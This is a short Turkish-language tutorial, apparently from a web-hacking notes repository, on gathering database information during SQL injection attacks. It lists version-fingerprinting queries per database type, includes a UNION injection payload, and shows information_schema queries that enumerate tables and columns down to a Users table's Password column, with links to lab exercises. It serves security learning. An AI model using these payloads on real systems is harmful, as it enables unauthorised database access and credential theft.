## SQLi saldırılarında veritabanının incelenmesi
SQLi saldırılarında veritabanı hakkında bilgi toplamak önemlidir çünkü kullanılan sürüme veya hangi tür veritabanını kullanıldığına göre SQLi için kullanacağımız sorgularda değişmektedir. Bu bilgiler şunları içerir:
- Veritabanı türü ve sürümü.
- Veritabanın tabloları ve bu tablolardaki sütunlar.
## Veritabanı türü ve sürümünü sorgulama
Sağlayıcıya özgü sorgular ekleyerek veritabanı türünü ve sürümünü belirleyebilirsiniz; bu şekilde hangisinin çalıştığını görebilirsiniz.

Aşağıda, bazı popüler veritabanı türleri için veritabanı sürümünü belirlemeye yönelik bazı sorgular yer almaktadır:
|Veritabanı türü|Sorgu|
|--|--|
|Microsoft, MySQL| `SELECT @@version` |
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|
For example, you could use a `UNION` attack with the following input:

    ' UNION SELECT @@version--
> [Oracle'da veritabanı türü ve sürümünü sorgulayan SQL enjeksiyon saldırısı.](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/Labs/Lab5.md)

> [SQLi saldırısı, MySQL ve Microsoft veritabanlarında veritabanı türü ve sürümünü bulma lab.](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/Labs/Lab6.md)

## Veritabanının içeriğinin listelenmesi
Çoğu veritabanı türü (Oracle hariç) bilgi şeması adı verilen bir dizi görünüme sahiptir. Bu, veritabanı hakkında bilgi sağlar.

Örneğin, veritabanındaki tabloları listelemek için `information_schema.tables` sorgusunu kullanabilirsiniz:

SELECT * FROM information_schema.tables
Bu, aşağıdaki gibi bir çıktı döndürür:

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
|---------------|--------------|------------|------------|
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |
Bu çıktı, `Products`, `Users` ve `Feedback` adlı üç tablo olduğunu gösterir.

Ardından, information_schema.columns sorgusunu çalıştırarak tek tek tablolardaki sütunları listeleyebilirsiniz:

    SELECT * FROM information_schema.columns WHERE table_name = 'Users'
Bu, aşağıdaki gibi bir çıktı döndürür:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|---------------|--------------|------------|-------------|-----------|
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |
Bu çıktı, belirtilen tablodaki sütunları ve her sütunun veri türünü gösterir.

> [SQLi saldırısı, veritabanlarındaki veritabanı içeriklerini listeleme lab](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/Labs/Lab7.md)
